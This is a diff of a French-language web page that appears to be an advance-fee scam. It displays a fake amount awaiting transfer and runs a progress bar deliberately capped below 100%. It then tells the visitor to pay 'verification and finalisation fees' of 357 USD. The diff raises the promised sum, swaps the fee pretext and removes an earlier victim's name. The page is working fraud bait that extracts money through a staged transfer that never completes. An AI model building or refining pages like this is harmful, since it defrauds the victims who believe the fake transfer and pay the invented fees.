@@ -187,7 +187,7 @@
 
       <div class="form-group">
         <label for="amount">Montant à recevoir</label>
-        <input type="text" id="amount" value="2 720 USD" disabled />
+        <input type="text" id="amount" value="3 149 USD" disabled />
       </div>
 
       <button class="btn" type="button" onclick="startProgress()">Procéder</button>
@@ -202,8 +202,7 @@
       </div>
 
       <div class="notification-message" id="notificationMessage">
-         Action requise : Cher Asende,
-Nous vous prions de bien vouloir régler les frais liés à la carte d’investisseur, indispensables pour finaliser le transfert. Le montant s’élève à 429 USD.
+  Felicitation vous avez réussi : Nous vous prions de bien vouloir régler les frais de vérification et de finalisation, indispensables pour compléter le transfert. Le montant s’élève à 357 USD.
       </div>
     </form>
   </div>
@@ -232,7 +231,7 @@ Nous vous prions de bien vouloir régler les frais liés à la carte d’investi
       const progressPercentage = document.getElementById("progressPercentage");
 
       const totalTime = 2 * 60 * 1000;
-      const maxProgress = 97;
+      const maxProgress = 99;
       const intervalTime = totalTime / maxProgress;
 
       const interval = setInterval(() => {
